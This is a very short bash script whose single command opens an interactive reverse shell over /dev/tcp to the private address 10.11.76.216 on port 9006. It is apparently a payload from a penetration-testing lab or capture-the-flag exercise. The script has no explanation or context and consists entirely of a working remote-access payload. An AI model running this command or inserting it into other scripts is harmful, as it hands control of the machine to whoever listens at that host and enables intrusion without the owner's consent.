#!/bin/bash

bash -c "exec bash -i >& /dev/tcp/10.11.76.216/9006 0>&1"
